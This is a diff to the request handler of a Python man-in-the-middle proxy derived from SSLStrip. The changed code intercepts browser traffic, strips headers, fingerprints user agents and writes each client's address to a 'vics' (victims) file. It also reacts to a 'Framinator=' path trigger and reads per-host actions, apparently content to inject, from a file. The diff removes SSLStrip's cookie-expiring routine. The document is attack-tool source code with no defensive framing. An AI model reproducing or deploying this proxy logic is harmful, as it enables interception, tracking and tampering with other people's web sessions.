@@ -12,9 +12,8 @@ from twisted.internet.protocol import ClientFactory
 
 from ServerConnectionFactory import ServerConnectionFactory
 from ServerConnection import ServerConnection
-from SSLServerConnection import SSLServerConnection
+#from SSLServerConnection import SSLServerConnection
 from URLMonitor import URLMonitor
-from CookieCleaner import CookieCleaner
 from DnsCache import DnsCache
 
 class ClientRequest(Request):
@@ -29,9 +28,7 @@ class ClientRequest(Request):
         Request.__init__(self, channel, queued)
         self.reactor       = reactor
         self.urlMonitor    = URLMonitor.getInstance()
-        self.cookieCleaner = CookieCleaner.getInstance()
         self.dnsCache      = DnsCache.getInstance()
-#       self.uniqueId      = random.randint(0, 10000)
 
     def cleanHeaders(self):
         
@@ -40,11 +37,11 @@ class ClientRequest(Request):
         if 'accept-encoding' in headers:
             del headers['accept-encoding']
 
-        if 'if-modified-since' in headers:
-            del headers['if-modified-since']
+        #if 'if-modified-since' in headers:
+        #    del headers['if-modified-since']
 
-        if 'cache-control' in headers:
-            del headers['cache-control']
+        #if 'cache-control' in headers:
+        #    del headers['cache-control']
 
         return headers
 
@@ -116,7 +113,6 @@ class ClientRequest(Request):
         headers           = self.cleanHeaders()
         agent             = self.getHeader("user-agent").upper()
         
-
         if agent.find("CHROME/") > -1:
             agent = "CHROME"
         elif agent.find("FIREFOX/") > -1:
@@ -124,7 +120,6 @@ class ClientRequest(Request):
         else:
             agent = "OTHER" 
              
-
         if path.find("Framinator=") != -1:
             if path.find("NOTHING") != -1:
                 self.sendOK()
@@ -157,14 +152,8 @@ class ClientRequest(Request):
            vics.write(client+";")        
            vics.close()
               
-        #Moxie Marlinspikes Code, from SSLStrip      
         self.dnsCache.cacheResolution(host, address)
-
-
-        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
-           logging.debug("Sending expired cookies...")
-           self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,host, headers, path))
-             
+                  
         if (self.urlMonitor.isSecureLink(client, url)):
            logging.debug("Sending request via SSL...")
            self.proxyViaSSL(address, self.method, path, postData, actAs,headers,self.urlMonitor.getSecurePort(client, url))
@@ -215,14 +204,6 @@ class ClientRequest(Request):
         connectionFactory.protocol = ServerConnection
         
         self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)
-    def sendExpiredCookies(self, host, path, expireHeaders):
-        self.setResponseCode(302, "Moved")
-        self.setHeader("Connection", "close")
-        self.setHeader("Location", "http://" + host + path)
-        
-        for header in expireHeaders:
-            self.setHeader("Set-Cookie", header)
-        self.finish()   
 
 
     def getAction(self,host):
@@ -238,7 +219,6 @@ class ClientRequest(Request):
                 line = line[:-1]
                 
             line = line.split("|")
-#            print h+" vs "+ line[0]
             if h in line[0]:
                if len(line[1]) > 0:
                   action = "\""+line[1]+"\""
